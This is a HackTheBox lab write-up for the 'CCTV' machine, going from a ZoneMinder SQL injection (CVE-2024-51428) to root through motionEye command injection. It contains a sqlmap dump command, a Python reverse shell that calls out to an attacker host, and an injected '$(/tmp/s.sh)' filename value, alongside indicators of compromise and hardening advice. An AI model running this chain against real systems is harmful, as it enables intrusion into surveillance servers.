---
layout: writeup
title: "CCTV"
platform: HTB
os: Linux
date: 2026-03-08
techniques: ["SQLi", "command injection", "HMAC bypass", "port forwarding"]
cve: ["CVE-2024-51428"]
description: "ZoneMinder SQLi to SSH, then motionEye command injection via unsanitized image_file_name for root via Motion daemon."
---

# CCTV - Technical Report

> **Platform:** HackTheBox \
> **Difficulty:** `Easy` \
> **Date:** 2026-03-08 \
> **Author:** 0N1S3C \
> **Scope:** Authorized lab environment only

---

## 0. Executive Summary

The "CCTV" machine hosted two internet-facing web applications — ZoneMinder (a CCTV management platform) and motionEye (a camera surveillance dashboard) — both suffering from critical security misconfigurations and unpatched vulnerabilities. An attacker with network access could exploit default credentials on ZoneMinder, leverage an authenticated SQL injection vulnerability (CVE-2024-51428) to extract credentials, pivot to SSH, and then exploit a command injection vulnerability in motionEye's unsanitized image filename field to achieve full root-level system compromise. Immediate remediation of default credentials, the SQL injection endpoint, and the motionEye command injection surface is strongly recommended.

---

## 1. Introduction

This report documents the structured analysis and controlled exploitation of the **"CCTV"** machine on HackTheBox.

**Objectives:**
- Obtain user-level access
- Obtain root/system-level access

**Methodology:** Assessments follow the standardized approach defined in `methodology.md`.

---

## 2. Attack Chain

```
Nmap → Default Creds (admin:admin) → SQLi CVE-2024-51428 → Hash Crack → SSH (mark)
→ SSH Port Forward → motionEye HMAC Auth → Command Injection (image_file_name) → Root
```

---

## 3. Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning & service detection |
| `gobuster` | Directory enumeration |
| `sqlmap` | SQL injection enumeration & exploitation |
| `john` | Password hash cracking |
| `ssh` | Remote access & port forwarding |
| `python3` | Custom HMAC exploit script |
| `nc` | Reverse shell listener |
| `curl` | API interaction & service probing |

---

## 4. Reconnaissance

### 4.1 Initial Network Scan

**Commands:**
```bash
nmap -sC -sV -Pn -T4 <target-ip>
```

**Findings:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu | Standard SSH |
| 80/tcp | HTTP | Apache 2.4.58 | Redirects to cctv.htb |

**Key Observations:**
- HTTP redirects to virtual host `cctv.htb` — added to `/etc/hosts`
- Only two ports exposed — small attack surface
- Ubuntu 24.04 identified from SSH banner

### 4.2 Virtual Host Setup

```bash
echo "<target-ip> cctv.htb" | sudo tee -a /etc/hosts
```

---

## 5. Service Enumeration

### 5.1 Web Enumeration

**Tools Used:** `gobuster`, manual inspection

**Commands:**
```bash
gobuster dir -u http://cctv.htb -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
gobuster dir -u http://cctv.htb/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x sh,cgi,pl,py
```

**Findings:**
- `/index.html` (200) — SecureVision CCTV company landing page
- `/javascript` (301) — forbidden
- `/cgi-bin/` (403) — present but empty (ShellShock ruled out)
- `/zm` — ZoneMinder installation discovered via Staff Login button in page source

### 5.2 ZoneMinder

Navigating to `http://cctv.htb/zm` revealed a **ZoneMinder** login panel.

Version identified via API after authentication:
```bash
curl -c cookies.txt "http://cctv.htb/zm/api/host/getVersion.json" --data "user=admin&pass=admin"
# {"version":"1.37.63","apiversion":"2.0"}
```

### 5.3 Internal Services (Post-Access)

After SSH access as mark, internal port enumeration revealed:

| Port | Service | Notes |
|------|---------|-------|
| 3306 | MySQL | ZoneMinder database |
| 7999 | Motion API | Internal camera control |
| 8554 | RTSP | Camera stream |
| 8765 | motionEye | Internal admin dashboard |
| 8888 | Unknown | Not further explored |
| 9081 | Stream | Camera stream port |

---

## 6. Initial Access

### 6.1 Vulnerability Identification

**Vulnerability:** Default credentials + CVE-2024-51428 (Authenticated SQL Injection)
**Location:** `http://cctv.htb/zm` — ZoneMinder 1.37.63
**Reasoning:** ZoneMinder was running with default `admin:admin` credentials. Once authenticated, the `tid` parameter in the `removetag` action was found to be unsanitized and injectable, allowing full database enumeration.

### 6.2 Exploitation — Default Credentials

Tested `admin:admin` against the ZoneMinder login panel — authentication succeeded immediately.

### 6.3 Exploitation — SQL Injection (CVE-2024-51428)

With a valid session cookie (`ZMSESSID`) obtained from browser DevTools:

```bash
# Enumerate all users
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
    --cookie="ZMSESSID=<redacted>" \
    -p tid --dbms=mysql --batch -D zm -T Users -C "Username,Password" --dump
```

**Users discovered:** `admin`, `mark`, `superadmin`

Mark's bcrypt hash was extracted and cracked — password: **[REDACTED]**

### 6.4 SSH Access

```bash
ssh mark@<target-ip>
# Password: [REDACTED]
```

**Result:** User-level access obtained as `mark`.

---

## 7. Lateral Movement

> Not applicable — went from mark directly to root via privilege escalation through motionEye.

---

## 8. Privilege Escalation

### 8.1 Local Enumeration

**Actions Performed:**
- [x] `sudo -l` — mark has no sudo rights
- [x] SUID binaries — nothing unusual
- [x] Running processes / internal ports — `ss -tlnp` revealed motionEye on 8765
- [x] Config files — `/etc/motioneye/motion.conf` contained admin SHA1 hash
- [x] motionEye source code — `/usr/local/lib/python3.12/dist-packages/motioneye/`

**Key Findings:**
- motionEye running internally on port 8765, Motion API on 7999
- `/etc/motioneye/motion.conf` exposed admin password SHA1 hash
- motionEye source code readable — real HMAC signature algorithm recoverable
- Motion daemon running as root (confirmed via command execution)
- Second user `sa_mark` exists at `/home/sa_mark` — user flag located there

### 8.2 Escalation Vector

**Vector:** motionEye command injection via `image_file_name` configuration field
**Root Cause:** The `image_file_name` value is written directly into Motion's `picture_filename` directive without sanitization. Motion evaluates shell syntax such as `$(command)` during filename generation, and the Motion daemon runs as root.

**Step 1 — SSH Port Forwarding** (new terminal, not the mark SSH session):
```bash
ssh -L 8765:127.0.0.1:8765 mark@<target-ip>
```

**Step 2 — Recover HMAC algorithm from source:**
```bash
grep -A 40 "def compute_signature" \
  /usr/local/lib/python3.12/dist-packages/motioneye/utils/__init__.py
```

Key insight: motionEye uses the stored SHA1 hash **directly as the HMAC key** — no plaintext password required.

**Step 3 — Write POSIX-compatible reverse shell to disk:**
```bash
# CRITICAL: Motion uses /bin/sh — bash-specific syntax like >& will fail
# Use Python reverse shell to avoid shell compatibility issues
echo 'python3 -c "import socket,os,pty;s=socket.socket();\
s.connect(([REDACTED],4444));os.dup2(s.fileno(),0);\
os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")"' > /tmp/s.sh
chmod 777 /tmp/s.sh
```

**Step 4 — Exploit via API (sanitized):**
```python
# Authenticate using real HMAC algorithm with hash as key
# Set image_file_name to execute reverse shell
config['image_file_name'] = '$(/tmp/s.sh).%Y-%m-%d'
config['still_images'] = True
config['capture_mode'] = 'all-frames'
# POST config update, then trigger snapshot via Motion API
```

**Step 5 — Start listener:**
```bash
nc -lvnp 4444
```

**Result:** Root-level shell received from Motion daemon.

---

## 9. Findings Summary

| # | Finding | Severity | Location |
|---|---------|----------|----------|
| 1 | Default credentials on ZoneMinder | 🔴 Critical | `http://cctv.htb/zm` |
| 2 | Authenticated SQLi CVE-2024-51428 | 🔴 Critical | ZoneMinder `tid` parameter |
| 3 | motionEye command injection via image_file_name | 🔴 Critical | motionEye camera config |
| 4 | Motion daemon running as root | 🔴 Critical | System service configuration |
| 5 | Admin password hash exposed in readable config file | 🟠 High | `/etc/motioneye/motion.conf` |
| 6 | Weak/crackable password for system user | 🟠 High | SSH user `mark` |
| 7 | motionEye internal dashboard unauthenticated via HMAC bypass | 🟡 Medium | Port 8765 |

**Severity Scale:**
`🔴 Critical` → `🟠 High` → `🟡 Medium` → `🔵 Low` → `⚪ Info`

---

## 10. Defensive Considerations

### 10.1 Indicators of Compromise

- `sqlmap` user-agent strings in ZoneMinder Apache access logs
- Multiple requests to `/zm/index.php?view=request&request=event&action=removetag`
- SSH login from external IP as `mark`
- SSH port forwarding session established by `mark`
- motionEye API calls with `_signature` parameter from localhost
- Outbound connection from server to attacker IP on non-standard port (4444)
- `/tmp/s.sh` created with world-executable permissions

### 10.2 Security Weaknesses

- Default credentials never changed on public-facing ZoneMinder installation
- ZoneMinder not updated to a patched version (CVE-2024-51428 affects 1.37.63)
- motionEye config files readable by unprivileged users
- Motion daemon running as root with no privilege separation
- `image_file_name` field passed unsanitized to shell execution context

### 10.3 Hardening Recommendations

| Priority | Recommendation | Finding |
|----------|---------------|---------|
| Immediate | Change default ZoneMinder credentials | Finding 1 |
| Immediate | Patch ZoneMinder to version unaffected by CVE-2024-51428 | Finding 2 |
| Immediate | Run Motion daemon as unprivileged user (e.g. `motion`) | Finding 4 |
| Short-term | Sanitize `image_file_name` input — strip shell metacharacters | Finding 3 |
| Short-term | Restrict read permissions on `/etc/motioneye/motion.conf` | Finding 5 |
| Short-term | Enforce strong password policy for all system users | Finding 6 |
| Long-term | Place internal services behind authenticated reverse proxy | Finding 7 |
| Long-term | Implement network egress filtering to block unexpected outbound connections | General |

---

## 11. Lessons Learned

- **`sh` vs `bash` matters for reverse shells** — Motion executes via `/bin/sh`. The `>&` redirect operator is bash-only and fails silently as a "Bad fd number" error in sh. Always use Python or Perl reverse shells when the target shell is unknown.
- **Read the source code** — the motionEye HMAC signature algorithm couldn't be guessed from documentation alone. The actual implementation on disk revealed that the stored hash IS the key, which unlocked the entire privesc path.
- **Check logs when execution fails** — `/var/log/motioneye/motion.log` showed the script was being called but failing, which pointed directly to the sh/bash issue.
- **Field names ≠ config file keys** — the motionEye API uses `image_file_name` while the motion.conf uses `picture_filename`. Assuming they match costs time.
- **The hash is often enough** — don't waste time cracking a hash if the application uses it directly as an authentication token.

---

*End of Report*

*Classification: Public (Redacted Version) — sensitive values redacted as this is an active HackTheBox machine*

*Full version with flags and credentials will be published after box retirement*
